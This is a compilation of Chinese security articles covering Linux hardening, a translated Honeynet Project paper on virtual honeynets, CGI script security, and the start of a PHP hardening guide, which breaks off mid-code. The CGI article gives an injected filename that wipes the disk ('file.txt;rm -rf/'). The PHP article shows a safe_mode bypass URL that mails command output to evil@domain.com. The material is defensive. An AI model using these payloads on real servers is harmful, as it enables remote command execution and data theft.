　　# This will overwrite /etc/issue at every boot. So, make any changes you 
　　# want to make to /etc/issue here or you will lose them when you reboot. 
　　#echo "" > /etc/issue 
　　#echo "$R" >> /etc/issue 
　　#echo "Kernel $(uname -r) on $a $(uname -m)" >> /etc/issue 
　　# 
　　#cp -f /etc/issue /etc/issue.net 
　　#echo >> /etc/issue 
　　其次删除"/etc"目录下的“isue.net”和"issue"文件： 
　　# rm -f /etc/issue 
　　# rm -f /etc/issue.net 
　　7、禁止不使用的SUID/SGID程序 
　　如果一个程序被设置成了SUID 
　　root，那么普通用户就可以以root身份来运行这个程序。网管应尽可能的少使用SUID/SGID 程序，禁止所有不必要的SUID/SGID程序。 
　　查找root-owned程序中使用s位的程序： 
　　# find / -type f ( -perm -04000 -o -perm -02000 ) -exec ls -lg {} ; 
　　用下面命令禁止选中的带有s位的程序： 
　　# chmod a-s [program]

以上是一些基本的安全设置技巧，俗话说：“道高一尺，魔高一丈”。只要是连上网的计算机，就有可被入侵。因此系统的定期检查和维护是相当重要的，对于及时发现入侵很有帮助，有助于我们亡羊补牢，赶在入侵者还没有破坏系统和数据之前把它们清理出去。所以接着就给大家讲一下这方面的技巧。
一、 优化分区结构
这对维护很有好处，我们应该把Linux的文件系统分成几个主要的分区，每个分区分别进行不同的配置和安装，一般情况下至少要建立/、/usr/local、/var和/home等分区。/usr可以安装成只读并且可以被认为是不可修改的。如果/usr中有任何文件发生了改变，那么系统将立即发出安全报警。当然这不包括用户自己改变/usr中的内容。/lib、/boot和/sbin的安装和设置也一样。在安装时应该尽量将它们设置为只读，并且对它们的文件、目录和属性进行的任何修改都会导致系统报警。
　　当然将所有主要的分区都设置为只读是不可能的,有的分区如/var等，其自身的性质就决定了不能将它们设置为只读，但应该不允许它具有执行权限。
二、 保护log文件
当与log文件和log备份一起使用时不可变和只添加这两种文件属性特别有用。系统管理员应该将活动的log文件属性设置为只添加。当log被更新时，新产生的log备份文件属性应该设置成不可变的，而新的活动的log文件属性又变成了只添加。这通常需要在log更新脚本中添加一些控制命令
定义虚拟Honeynets
虚拟蜜罐网络的不同类型



Honeynet Project

http://www.honeynet.org

Last Modified: 27 January, 2003

翻译：Inetufo

Homepage:http://www.fz5fz.org

Email:Inetufo@fz5fz.org

译者注：

本文主要定义了虚拟Honeynet的概念，讲述了它和传统Honeynet的不同之处，搭建虚拟Honeynet的三种常用方法及其优缺点。

由于本人对某些术语的把握不够，所以可能存在翻译不当之处，还望各位斧正。

原文连接：http://www.honeynet.org/papers/virtual/







在过去的几年里，Honeynets证明了他们作为一个主要研究blackhat组织所使用的攻击工具，策略，和动机的安全组织的价值。对于某些组织更好的理解和防御所面临的威胁来说，这些信息是非常重要的。Honeynet的主要问题之一是它们是深奥的，难以构建的，难以维护的资源。Honeynet要求对物理系统和安全机制进行多样的有效的配置。然而，Honeynet工程正在研究一种新的，可能的，虚拟Honeynets。这些系统共享很多传统的Honeynets的价值，但是拥有在一个系统上运行所有系统的优点。这便使虚拟Honeynets构建更廉价，配置更容易，维护更简单。



什么是Honeynet

Honeynets是honeypot的一种形式。Honeypot是用来让人攻击，存在安全风险的资源。而Honeynet是一种交互性很高的Honeypot，这就意味着他要保护和攻击者直接打交道的真正的操作系统。这种高度的交互性能够使我们了解入侵者怎样攻破系统，怎样联系和为什么要入侵系统的一切东西。Honeynets是通过构建一个网络系统来实现这个目的的。这个网络是高度集成的，所有流入和流出的数据都会被控制和捕捉，在这个网络中的每一个系统都是一个真正的Honeypot，每个系统都是为了诱导攻击者的攻击而设计。但是，在目前的大多数组织中，Honeypots是构建相同的，全面的功能系统。当这些系统被攻击时，Honeynets捕获攻击者的所有活动。这些信息使我们能够找到对于我们当前所面临的威胁的一个好的处理方法。关于Honeynets的技术细节，你可以参考Know Your Enemy: Honeynets。我们这篇文章主要讲述构建虚拟Honeynets的不同方法。但这并不是讲述怎样构建一个虚拟Honeynets。怎样建立虚拟Honeynets的细节将在以后讲述。从这个观点出发，你得对Honeynet技术和它们的需求有一个大概了解，特别是数据控制和数据捕获。



虚拟Honeynets

什么是虚拟Honeynet?它是允许你在一个计算机系统上运行你需要的一切东西的一种解决方案。我们之所以用术语虚拟，是因为所有不同的系统都有他们自己的运行‘方式’，而不依赖于电脑。

这些解决方案是可能的，因为有允许在同一时间，同一硬件平台上运行多个操作系统的虚拟软件。虚拟Honeynets本质上不是一种新技术，它们只是简单的采用了Honeynet技术的概念，而把它们在一个系统上实现。和传统Honeynets比较，这种实现有他独特的优点和缺点。

优点是：开销较小，易于管理，因为所有东西都被整合在一个系统中。你可以用一台电脑来配置一个虚拟Honeynet来代替用8个电脑配置的一个全面的Honeynet。但是，这种简单会付出一定的代价。首先，通过硬件和虚拟软件能够配置的操作系统类型具有局限性。比如，大多数Honeynets是基于Intel X86芯片的，所以你只能配置基于这种结构的操作系统。你绝不可能在一个虚拟Honeynet中配置Alteon switch, VAX, 或者Cray computer。其次，虚拟Honeynet会带来风险。特别是攻击者可能会破坏虚拟软件，并且控制整个Honeynet，从而达到对整个系统的控制。最后，有指纹识别的风险。一旦破坏者攻破了你虚拟Honeynet所在的系统，他们就能够确定系统是在一个虚拟环境中运行。



我们把虚拟Honeynets分为两种类别，独立的和混杂的虚拟Honeynet。在这两者当中，独立虚拟Honeynet是比较普遍的。我们将首先定义这两种不同的类型，然后再讲述虚拟Honeynets的不同配置方法。



独立虚拟Honeynet

一个独立虚拟Honeynet是被浓缩到一台电脑上的一个完整的Honeynet网络。这个完整的网络被虚拟的包含在一个单一的物理系统中。一个Honeynet网络的典型组成是，一个用于数据控制和数据捕获的防火墙网关，和在Honeynet中的honeypots。你能够看在这里看到这种配置的图。这种类型的虚拟Honeynet(s)具有的某些优点如下：

l 可移植性。虚拟Honeynets能够搭建于移动电脑上，能被带到任何地方。Honeynet Project在2002年8月的Blackhat简报上证明了这项功能。

l 即插即可捕获。你只需要一台电脑，把他连接到任何一个网络上就可以作好抓获那些blackhats的准备。这使的配置容易许多，因为你仅仅要做的只是物理配置和连接一个系统。

l 资金和空间上的节省。你只需要一台电脑，所以这就减少了你硬件上的开支。他只需要一个很小的空间来放置，仅仅使用一个出口和一个端口！对于我们这些时间和能力有限的人来说，这是一个节省的好办法。

缺点如下：



l 如果硬件出了问题，整个Honeynet将不能使用。

l 高质量的电脑。尽管一个独立的Honeynets只需要一台电脑，但是他必须是一个强大的系统。取决于你的设置，你必须拥有足够的内存和处理能力很强的处理器。

l 安全性。因为所有东西都共享硬件资源，所以存在攻击者攻破系统其他部分的危险。这些大多数取决于虚拟软件，稍后将讨论。

l 软件局限性。因为所有东西都在一个系统中运行，你能使用的软件就会受到限制。例如，在Intel芯片上运行Cisco IOS是非常困难的。



混合虚拟Honeynet

混合虚拟Honeynet是传统Honeynet和虚拟软件的混合体。数据捕获，比如防火墙，数据控制，比如IDS传感器和日志在一个隔离的，孤立的系统中。这种孤立减小了被攻击的风险。然而，所有的honeypots都是虚拟的运行在一个单独的窗口中。你可以在这里看到演示图。

这种设置的优点是：

l 安全性：在独立虚拟Honeynets中，存在攻击者攻破honeynet其他部分（比如说防火墙）的危险。在混合虚拟Honeynet中，唯一的危险只可能是攻击者进入其他的honeypots。

l 灵活性：你可以使用多种软件和硬件来实现混合网络的数据控制和数据捕获。例子之一，你可以在网络上使用OpenSnort或者Cisco pix appliance。你也可以运行你想要运行的任何一种honeypot，而放弃在网络上的另一台主机。（虚拟Honeypot’s主机除外）。

一些缺点：

l 不可移植，既然honeynet网络由多台主机组成，那么移动就很困难。

l 时间和空间的高价性：网络中有多台电脑，你将花费更多的精力，空间和资金。

可能的解决方案

既然我们定义了虚拟Honeynets的两种常见类型，那么让我们重点讲述实现一个虚拟Honeynet的可能途径。这里，我们概述出三种允许你自行配置的技术。勿庸置疑，还有其他的意见，比如说Bochs，但是Honeynet Project已经使用并测试过所有这三种方法。三种方法没有好坏之分。相反的，他们各自都有自己独特的优点和缺点，你采用哪种方案能够工作的更好完全取决于你自己。我们要讲述的三种方案是VMware Workstation, VMware GSX Server, 和用户模式 Linux。





VMware Workstation

VMware Workstation是一个长期使用的和确定的虚拟Honeynet的选择。它是为桌面用户设计的，可以运行在Linux和Windows两种平台下。使用VMware Workstation来做虚拟Honeynet的优点是：

l 多种操作系统的支持，你可以在一个虚拟环境中运行各种各样的操作系统（称之为GuestOS’s），包括Linux,Solaris,Windows和FreeBSD Honeypots。

l 网络选择，工作站提供了处理网络的两种方式。第一种是桥，它对混合虚拟Honeynet网络来说非常有用，因为它使honeypot使用电脑的板卡，就像其他主机位于Honeynet网络上一样。第二种选择是 Host-Only 网络, 这对独立虚拟Honeynets来说很好，因为你可以通过防火墙更好的控制网络传输。 

l VMware Workstation为每一个客户操作系统创建一个映像。这些映象单单是一个文件，移植性很高。这意味着你可以把他们转移到其他电脑上。你可以通过拷贝备份来恢复一个honeypot到他的最初状态。

l 挂装VMware虚拟磁盘映象的可能性。你可以使用vwware-mout.pl驱动来挂装一个VMware映像。

l 使用简单。 VMware Workstation 有图形接口 ( Windows 和 Linux) ，使得安装，配置，运行操作系统非常简单。 

l 作为一个商业产品，VMware Workstation有技术支持，可以升级，可以打补丁。

一些缺点：

l 成本，每个VMware workstation许可花费$300。这对于某些爱好者或者没有收入的学生来说可能有点昂贵。

l 资源需求，VMware Workstation必须在X环境下运行，每个虚拟机都应该有自己的窗口。所以，除了为GuestOS分配内存外，还要为X系统分配内存。

l GuestOS数量限制，你只能用VMware运行很少数量的虚拟机（1-4）。这可能比较有利于小型的Honeynet。

l 源代码不公开，因为VMware源代码未公开，所以你不能进行真正的自定义配置。

l 指纹识别。在honeypot上VMware软件可能会被识别出来，特别是”VMware tools”装在系统上。这就可能把honeypots暴露给blackhat。然而，VMware提供选项设置，使指纹识别更加困难，比如有为虚拟接口设置MAC地址的功能。



VMware有一些好的特征，如挂起虚拟机的功能。你可以暂停VM，当你恢复暂停时，所有进程继续运行，就象什么都没有发生过一样。一旦某个系统有安全隐患，并且入侵者开始ICMP碎片攻击，同时登录到IRC服务器。我们并不想断开连接，因为这样我们将失去很多重要的信息。所以我们可以挂起VM，配置防火墙来阻止攻击，然后恢复VM。VMware和其他虚拟软件的一个有趣的用处就是可以简单快速的配置出虚拟机。。一旦Honeynet有安全威胁，我们可以通过它尽可能多的了解到一些信息。对于虚拟Honeynet来说，我们所要做的所有工作是拷贝文件或者用不能在VMware Workstation中继续使用的磁盘来抛弃任何发生的改变。VMware工作站的另一个特性是可以在HostOS后运行若干个网络。所以，如果你只有一个窗口，你可以将你的honeynet和所有个人电脑放在一个窗口中，而不必担心双方之间的数据损坏。如果你想对VMware和它架设honeypot技术的能力获得更多的信息，请参考Kurt Seifiried的经典文章Honeypotting with VMware - The Basics.，以及Ryan Barnett写的Monitoring VMware Honeypots。

VMware GSX Server

VMware GSX Server是VMware Workstation的增强版本。也就是它说可以运行很多高端服务器。我们可以看到, 用它来搭建一个 Honeynet将很完美。 目前GSX Server作为Host OS运行在Linux和Windows上。如果你想了解在GSX上配置虚拟Honeynets的信息，请参考文章Know Your Enemy: Learning with VMware。优点：

l 操作系统的大范围支持。GSX Server支持Windows (包括95, 98, NT, 2000, XP and .NET server)，各种Linux发行版，BSD和Solaris(非正式支持)。

l 网络支持，包括Workstation支持的所有网络功能。

l 不需要X支持更多的GuestOS。GSX Server 不需要运行X来运行VMware。这就使你能够同时运行更多的GuestOS。如果主机运行Linux也不需要安装X库。

l Web接口，GSX Server可以通过Web接口来配置。可以通过Web启动，暂停，创建GuestOS。

l 远程终止，这是GSX Server最好的特性之一。尽管通过Web和一些VMware软件,你可以远程访问GuestOS’s,就象你是坐在控制台前一样。你可以做一些事情，比如远程安装和检查系统，而不会在honeynet上传送数据。

l 装载VMware虚拟磁盘映象，和在WorkStation版中一样。

l VMware GSX Server可以支持更多的主机内存(最高8GB),更多的CPU（最多8个）每个虚拟主机比VMware WorkStation支持更多的内存（2GB）。

l 包含用于管理GuestOS’s的Perl API函数。

l 和WorkStation一样,GSX Server是一个提供技术支持的产品,包括补丁和升级。

一些缺点：

l 费用，一份GSX Server许可证需要花费$3,500

l GuestOS’s种类的限制性，象Solaris X86和FreeBSD这些操作系统不被正式支持（虽然你可以安装他们）。这就限制了你的Honeynet的多样性。

l 内存消耗，GSX Server 推荐大于256的内存只用来运行GSX Server软件。基于视窗的操作系统，比如Windows XP，需要另外256MG的内存来运行另外的实例。

l 源代码不开放，和Workstation一样。 

l 指纹。在honeynet有可能探测到VMware软件，尤其是系统中装有“VMware tools”。这可能会使honeypots暴露给blackhat。但是，和Workstation一样，有降低风险的配置选项。

VMware 同样也开发VMware ESX Server 服务器版。 ESX Server运行在硬件接口上，而不仅仅是一个软件解决方案。ESX Server 拥有自己的控制主机硬件的虚拟机操作系统，这样就允许对虚拟机资源进行更多细微的控制，比如说CPU共享，网络带宽共享，磁盘带宽共享，同时允许这些资源被动态的改变。它一个是比GSX Server更高端的产品 。它的一些特性是：可以支持多处理器, 更多并发的虚拟机(最多可达64个), 更多内存 (最多可达64GB) ，每个虚拟机比GSX Server支持更多的内存 (最多可达 3.6GB).

用户模式Linux

用户模式Linux是允许你在同一时刻运行多个Linux虚拟版本的一种特殊的内核模块。由Jeff Dike开发。,UML使你可以在同一时间同一个系统上运行Linux的多个实例。它是一个很有发展潜力的新的相关工具。你可以在文章 Know Your Enemy: Learning with User-Mode Linux中详细的学习怎样配置你自己的UML Honeynet。

使用用户模式Linux的一些优点是: 

免费和开放源代码，你可以控制源代码。 
小内存和更少的资源要求。 用户模式 Linux 不需要使用X。它可以用很少的内存运行大量的系统。 
能够创建多个虚拟网络 甚至可以完全在原始的虚拟网络中创建虚拟路由器。 
同时支持bridging 和 networking, 和VMware相似. 
UML可以通过GUESTOS内核记录击键信息。 击键信息被记录在 HostOS上, 所以怎么在honeypot中秘密的获得击键记录没有任何问题。 
UML有预先的配置和可下载的文件系统，这使它可以更快更简单的用honeypots搭建Honeynet。像VMware一样这些文件系统映像是可挂装的。 
你可以用多种不同的方式控制UML控制台, 包括通过pseudoterminals, xterms, 以及Telnet一个主机的端口。并且有窗口，你可以在窗口中运行UML，释放他，你也可以在任何地方登录连接主机.。 
一些缺点： 
目前只支持Linux虚拟机,Windows下的接口正在开发中。 
作为一个新的工具，存在一些缺陷,如：文件,安全问题。 
没有GUI接口,目前所有的配置和运行都在命令行下进行。入门比较困难。 
作为一个开放源代码的工具, 没有官方和商业上的支持。 
和VMware一样， 可以通过虚拟软件来取得UML. Honeynet的指纹。然而, 维护者Jeff Dike 设法减少这种风险, 比如说在GuestOS上对/proc进行修改。 
结论
这篇文章的目的是定义什么是虚拟Honeynet,虚拟Honeynet的不同种类，以及配置意见。虚拟Honeynet采用了Honeynet的技术，而把它们整和在一个系统中。这就使得它们构建更廉价，配置更简单，维护更容易。但是，他们仍然存在普遍的缺点，包括物理硬件和虚拟软件的失败和局限性。你可以自己决定哪种方案更适合你的环境。今后，我们打算写出怎样配置这些技术的细节文档。
浅析CGI的安全问题
CGI在构建WebSite时，用得非常频繁，尤其是将CGI程序与javascript结合起来，可以实现强大的功能，正是因为CGI程序的在Server端的强大处理能力，只要CGI脚本中有一点安全方面的失误，就能使入侵者能访问计算机，造成难以预料的后果。
一、脚本和程序
在开始决定采用何种语言编写CGI脚本时应考虑几个因素，其中之一应是安全性。Shell 脚本，Perl脚本、Php脚本和C可执行程序是CGI脚本最常采用的形式，目前在MicroSoft的ASP也用得比较多，从安全性角度来说每种都备有优缺。尽管没有哪一种是最好的——基于其他方面的考虑，如速度和可重用性——每种都有实用的领域。
Shell脚本一般用于小的、快速的甚至可以用完就不要的CGI程序，因此，编写它们时常常不考虑安全性。这种疏忽可以导致一些缺陷，使得仅对系统具有一般知识的人也能进入系统任意走动。
尽管Shell CGI 程序最容易写，甚至只需拼凑一下即可，但控制它们却很困难，因为它们一般是通过执行外部的其他程序来完成工作的。这就导致一些可能的隐患，CGI 程序会继承任何它使用的程序的安全问题。
Perl比Shell脚本更进一步。Perl用于CGI编程有很多优点，并且相当安全。但Perl能给CGI 作者提供足够的灵活性从而导致对安全性的错误感觉。例如，Perl是解释型的。这意味着它实际在调用时是先编译，然后每次执行一步。这就很容易使得不正确的用户数据被包括进来作为代码的一部分，从而错误地进行解释，形成程序中止原因。
最后谈谈C。C迅速成为标准应用开发语言，几乎所有的UNIX和windows NT系统都是用它开发的。从安全性的角度来看C 似乎是很不错，但由于它的流行性，它的好几种安全性问题已广为人知，而这些问题也能很容易地被人利用。
二、信任
几乎所有的CGI 安全问题都来自与用户的交互。接收来自外部数据源的输入之后一个简单的、可预见的CGI程序突然向多方向伸展，每个方面都可能有最小的缝隙使得“黑客”可以溜进来。正是与用户的这种交互——通过表单或文件路径——才给予了CGI 脚本这种能力，但同时也使得它们成了运行在Web服务器上的最潜在的危险部分。
编写安全的CGI 脚本很大程度上是创造性和妄想的结合。编写者必须有足够的创造性才能想到用户使用的，不管是无意地还是别的所有的可能隐含导致问题的发送数据的方式。而且必须有点妄想，因为有可能不知道什么时候、什么地方、他们将会一一加以试验。
2.1 两种导致问题的方式
当用户登录进入Web 站点并开始进行交互访问时，他们能以两种方式惹麻烦。一种是不遵守规则，歪曲或违反页面中建立的每个限制或约束;另一种方式是按要求去做。
大部分CGI 脚本是作为HTML表单的后台运行的，负责处理由用户输入的信息并提供某种定制的输出。因为在这种情况下，大部分CGI 脚本编写时都等待某种特殊格式的数据。它们期望用户的输入能匹配收集并发送信息的表单。不过事情并不总是这样。用户可以有许多种办法绕过这些预定义的格式而给脚本发送一些看起来是随机的数据。CGI 程序必须对此有所准备。
其次，用户可以给CGI 脚本发送所期望的数据类型，按预期的形式在表单中填入每个字段。这种类型的提交可以是想像中的来自某个与站点交互的无意的用户，也可能来自某个恶意的“黑客”，凭借他有关操作系统和Web 服务器软件的知识并利用常见的编程错误。这些入侵，表面上一切都正常，却是最危险的、最难检测出来。Web 站点安全性依赖干这种入侵的防止。
2.2 不要相信表单数据
在CGI 编程中最常见的安全失误就是相信从表单传到脚本的数据，用户是未知的一大堆人，他们总能找到一些编程人员从来没想到过的发送数据的方法--而且是程序员认为几乎不可能的方法。脚本必须对这些加以考虑。例如，下面这些情形都是可能的:
1) 从一组单单选按钮中选择的结果可能不是表单中提供的选项之一。
2) 来自某个文本字段的数据长度可能大于MAXLENGTH字段允许的长度。
3) 字段本身的名字可能与表单中指定的不相符。
2.3 拒绝不合要求的表单数据
CGI脚本可以有几种方式拒绝接收提交给它的非预期的输入。编写CGI时应该使用其中一些技巧或所有这些技巧。
首先，CGI 脚本应设置接收多少数据的限制，不仅限制整个提交，也限制提交中的每个NAME/value对。例如，CGI脚本读取POST METHOD，检查CONTENT-LENGTH环境变量的大小来确定某输入是不是合理的预期输入。如果CGI 脚本设计接收的唯一数据是某人的姓名，那么如果CONTENT-LENGTH大于100字节，就应该有理由返回一个错误。没有哪个合理的姓有那么长，通过设置限制，就能使脚本不再盲目地读取发送给它的内容。
下一步，应保证脚本知道在接收到不能识别的数据时该怎么办，例如，如果某表单要求用户选择两个单选按钮之一，脚本就不应该假设因为一个按钮未被选择，另一个就一定被选择了。下面的Perl代码就犯了这样的错误:
if ($form_Data{"radio_choice"} eq "button_one"){
# Button One has been clicked }
else {
# Button Two has been clicked }
这段代码假定因为表单仅提供了两个选项，而第一项未被选中，那么第二项就肯定被选中了。这不一定是真的。尽管前面的例子没有什么害处，但在某些情况下这样的假设可能很危险。
CGI脚本应该能预期这种情形而相应地进行处理。例如，如果出现一些非预期的或"不可能"的情形，可以打印一个错误，如下所述:
If ($form_Data{"radio_choice"} eq "button_one") {
#Button One seleted }
elsif ($form_Data{"radio_choice} eq "button_two") {
#Button Two Selected }
else {
#Error }
通过加入第二个if语句－－显式检查"radio_choice"实际上是"button_two"－－这样脚本更安全了;它不再做假设了。
当然，错误不一定是期望脚本在这些情形下生成的。有些脚本过于小心，验证每个字段，即使是最轻微的非预期数据都生成错误信息，这样往往很扫用户的兴。让CGI 脚本识别非预期数据然后扔掉它，并且自动选择一个缺省值也可以。
最后，可以更进一步，让CGI脚本能处理尽可能多的不同的输入表单。尽管不可能预期到可能发送给CGI程序的所有内容，但对某个特定方面一般经常有几种常用的方式，因而可以逐个检查。
总而言之，脚本应该不对接收的表单数据进行假设，应尽可能预计意料之外的情形并正确地处理不正确的或错误的输入数据。在使用数据之前应按尽可能多的方式测试它；拒绝不合理的输入并打印一条错误消息；如果某项出错或漏了应自动选择一个缺省值；甚至可以试图对输入进行编码以成为程序的合理的输入。选择哪种方式依赖于自己想花费多少时间和精力，不过记住永远也不要盲目接收传给CGI脚来的所有信息。
2.4一切看起来都正常，不过…
现在已经知道了用户能给CGI脚本提供非预期的数据的几种方式以及如何对付它们了，余下的更大问题是如何验证用户提交的合法数据。
大部分情况下，正确但聪明地编写的表单提交会导致比越界数据更多的问题。忽略无意义的输入很容易，但确定合法的、正确格式的输入会不会导致问题就要困难得多。因为CGI脚本非常灵活，几乎可做计算机能做的任何事情，所以安全方面的一个很小失误往往能被无限制地加以利用——而这正是最危险的地方。
2.5 处理文件名
文件名是提交给CGI脚本的简单数据，但如果不小心的话，却能导致许多麻烦。如果用户输入的名字中包含路径因素，如目录斜杠和双点，尽管期望的是输入一个简单的文件名--例如file.txt--但结果却可能是/file.txt或../../../file.txt。根据Web服务器的安装以及对提交的文件名做什么操作，系统中的所有文件就有可能都暴露给了一个聪明的黑客。
进一步，如果用户输入了一个已有文件的名字或者一个对系统的运行很重要的文件名，怎么办？对如果输入的名字是/etc/passwd或C:\WINNT\SYSTEM32\KRNL32.DLL怎么办？根据在CGI脚本中对这些文件进行什么操作，它们有可能被发送给用户或者被垃圾覆盖了。在Windows 95和Windows NT下，如果不检查反斜杠字符(\)，可能会允许Web 浏览器通过UNC文件名访问甚至不在该Web机器上的文件。
如果用户在文件名中输入了不合法的字符怎么办？在UNIX下，任何以句点(.)开头的文件名都是不可见的。在Windows下斜杠(/)和反斜杠(\)都是目录分隔符。很可能不小心写了一个Perl程序，当文件名以管(pipe)(│)开头时，尽管自己以为仅仅是打开了一个文件，实际上却是执行了一个外部程序。如果用户知道怎么办的话，甚至可以把控制字符(例如Escape键或Return键)作为文件名的一部分送给脚本。
更坏的情况是，在shell脚本中，分号用于结束一条命令并开始另一条命令。如果脚本设计目的是cat用户输入的文件，用户可能输入file.txt;rm-rf/作为文件名，导致返回fi1e.txt，然后清除整个硬盘而不经任何确认。
2.6 输入合理，输出却不合理
为了避免所有这些问题，关闭由它们打开的所有安全缝隙，检查用户输入的每个文件名。必须确保输入正是程序预期的输入。
这样做的最好办法是将输入的文件名的每个字符与可接收字符的清单进行比较，如果不匹配就返回一个错误。这比维持一个所有合法字符的清单并比较它们要安全得多——要想让什么字符溜掉太容易了。
以下程序清单是用Perl如何完成这种比较的例子。它允许任何字符字母(大写或小写调)、任何数字、下划线和句点。它还进行检查以确保文件名不以句点开头。这样，该段代码就不允许可以改变目录的斜杠，不允许可以将多条命令放在一行的分号，或者破坏Perl的Open()调用的Pipes了。
程序清单 保证所有字符都是合法的
if (($file_Name =~ /[^a-zA-Z_\.]/) ││ ($file_Name =~ /^\./)) {
#File name contains an illegal characgter or starts with a period
}
警告
尽管上述程序清单中的代码清除了大部分不合法的文件名，但操作系可能还有一些限制，而该代码没有覆盖到。例如，文件名可以用数字开头吗？或者以下划线开头？如果文件中包含多个句点或者句点后多于三个字符怎么办？整个文件名足够短得能满足文件系统的限制吗？
必须不断向自己提出这种问题。在写CGI脚本时最危险的事是认为用户会遵守指令。其实用户是不会的。保证用户不犯错误是编程者自己的事。
三、内部伤害
到目前为止，仅仅考虑了通过Web例览站点的人——从几千里之外——可能带来的潜在的安全危险。但实际上还存在另一种离得更近的危险因素。
在CGI安全问题上常犯的一种错误是忘记了本地用户。尽管通过Web浏览站点的人不影响本地安全，如文件保护和所有者，但Web服务器的本地用户却能这样，必须做出更多努力防止这些入侵。大部分多用户系统上，如UNIX，Web服务器是作为一个程序运行的，而机器仍被许多人使用做着许多事情。仅仅因为为某人与自己一起工作或访问自己的学校并不意味着他能抵制住诱惑，而不去捣鼓Web安装从而引起问题。
3.1 CGI脚本用户
大部分Web服务器是作为运行CGI脚本的特殊用户而安装的。这是在CGI程序运行时拥有该CGI程序的用户，并且他所拥有的权限能限制该脚本能做什么事情。
在UNIX下，服务器自己也是作为root(系统的超级用户或管理员)运行的，并允许它使用端口80作为浏览器与之通信的地方(只有root能使用这些被称为"保留的"端口0到1023;所有用户都可以使用其余的端口)。当服务器执行CGI程序时，大部分Web服务器都能设置为以另外一个用户而不是Web服务器本身来运行该程序——尽管不是所有服务器都能这么做。
将CGI脚本作为root运行是很危险的！服务器应被设为利用一个普通用户，如常用的nobody来运行CGI脚本。用户权限越小，运行的CGI脚本能造成的危害就越小。如Apache WebServer在启动后会将用户权限自动切换为nobody。
3.2 Setuid 危险
编程者还应知道自己的UNIX CGI脚本中是否设置Setuid位。如果对某个可执行文件允许该选项，将能使该程序与拥有该文件的用户有同样权限，而不是执行它的用户。如果自己的CGI脚本上设置setuid位，无论服务器作为什么用户来运行它，它的权限都等同于该文件的拥有者。这当然有很大的隐患--可能会对以其权限运行脚本的用户失去控制。幸运的是Setuid位很容易被禁止。对所有CGI脚本执行chmod a-s即能关闭所有的setuid，程序即能以允许的权限运行。
当然，在某些情况下也许希望设置setuid位--例如如果脚本需要以特殊用户身份来运行以访问一个数据库。在这种情况下，必须加倍小心确保该程序的其他文件保护能将可以访问它的用户限制在允许范围内。
3.3 "Community" Web服务器
即使Web服务器以一个常用的用户来执行脚本，仍有一个潜在的问题，那就是一个人并不总是能控制服务器。如果许多人共同控制服务器，每个人都可以将CGI脚本安装作为nobody用户来运行。这就使这些人的任何一个都可以利用CGI程序访问他们原先不能访问的地方，而这些地方是nobody允许进入的。
也许潜在的安全问题的解决办法是将CGI的控制限制为一个人。在某些情况下尽管这似乎是合理的，但对较大站点却经常不太可能。例如，一个大学有几百个学生，每个学生都想试着去编写并安装CGI脚本。
3.4 使用CGI Wrap
当有多个用户可以访问CGI时，对于确定脚本以什么用户运行的问题的一个较好的解决办法是CGI wrap程序。CGI Wrap，可以在using CGI Web站点中找到，是一个简单的包装，它以拥有该文件的用户而不是服务器指定的用户来运行CGI脚本。这种简单的预防措施使脚本拥有者对它可能的危害负责。
因为CGI wrap使得CGI脚本的作者负责他们自己的脚本权限，所以它不仅是一个保护其他人拥有的重要文件的有力的工具，而且是促使人们编写安全的脚本的有力的工具。只有他们自己的文件会处于危险之中，这样的现实对脚本作者会是极大的促进。
3.5 使用显式路径
最后，本地用户还可以最后一种方式攻击Web服务器——欺骗服务器运行他写的一个外部程序，而不是运行在CGI脚本中指定的程序。下面是一个简单的程序，从UNIX的fortune命令可以看出该浏览者还比较聪明。
#!/bin/sh
# Send the header
echo"conten_type:text/html"
echo""
#Send the fortune
echo"<HTML><HEADER><title>Fortune</title></HEADER><BODY>"
echo "<You crack open the cookie and the fortune reads:<HR><PRE>"
fortune
echo "</PRE><BODY></HTML>"
该脚本看起来可一点没有害处。它不接收用户输入，所以用户不能籍此搞什么把戏。因为它仅由Web服务器运行，所以脚本本身的权限设置可以非常严格，可以防止任何有企图的本地用户修改它。如果对该脚本所在的目录也设置了正确的权限的话，看起来就没什么地方可以出问题了，是不是？
当然还有问题。记住得要有点偏激。
上述程序清单调用了外部程序，在本例中是echo和fortune。因为这些脚本没有用显式路径指明它们在硬盘上的位置，该shell即使用PATH环境变量来找到它们，从变量中的每一项查找要执行的程序。这可能很危险。例如，如果fortune程序安装在/usr/games中，但PATH中在它之前列出了/TMP，那么任何碰巧命名为"fortune"并位于临时目录的程序都会被执行，而不是真正的fortune。
该程序可以做它的创建者想做的任何事情，可以删除文件，也可以登记有关请求信息并将数据传给真正的fortune--使用户和编程者谁也不聪明。在CGI脚本中运行外部程序时一定要指定显式的路径。PATH环境变量有很大作用，但它与其他变量一样也能被非法使用。
PHP安全配置
一、Web服务器安全
PHP其实不过是Web服务器的一个模块功能，所以首先要保证Web服务器的安全。当然Web服务器要安全又必须是先保证系统安全，这样就扯远了，无穷无尽。PHP可以和各种Web服务器结合，这里也只讨论Apache。非常建议以chroot方式安装启动Apache，这样即使Apache和PHP及其脚本出现漏洞，受影响的也只有这个禁锢的系统，不会危害实际系统。但是使用chroot的Apache后，给应用也会带来一定的麻烦，比如连接mysql时必须用127.0.0.1地址使用tcp连接而不能用localhost实现socket连接，这在效率上会稍微差一点。还有mail函数发送邮件也是个问题，因为php.ini里的：
[mail function]
; For Win32 only.
SMTP = localhost
; For Win32 only.
sendmail_from = me@localhost.com
都是针对Win32平台，所以需要在chroot环境下调整好sendmail。
二、PHP本身问题
1、远程溢出
PHP-4.1.2以下的所有版本都存在文件上传远程缓冲区溢出漏洞，而且攻击程序已经广泛流传，成功率非常高：
2、远程拒绝服务
PHP-4.2.0和PHP-4.2.1存在PHP multipart/form-data POST请求处理远程漏洞，虽然不能获得本地用户权限，但是也能造成拒绝服务。
3、safe_mode绕过漏洞
还有PHP-4.2.2以下到PHP-4.0.5版本都存在PHP mail函数绕过safe_mode限制执行命令漏洞，4.0.5版本开始mail函数增加了第五个参数，由于设计者考虑不周可以突破safe_mode的限制执行命令。其中4.0.5版本突破非常简单，只需用分号隔开后面加shell命令就可以了，比如存在PHP脚本evil.php：
<? mail("foo@bar,"foo","bar","",$bar); ?> 
执行如下的URL：
http://foo.com/evil.php?bar=;/usr/bin/id|mail evil@domain.com
这将id执行的结果发送给evil@domain.com。
对于4.0.6至4.2.2的PHP突破safe_mode限制其实是利用了sendmail的-C参数，所以系统必须是使用sendmail。如下的代码能够突破safe_mode限制执行命令：
<?
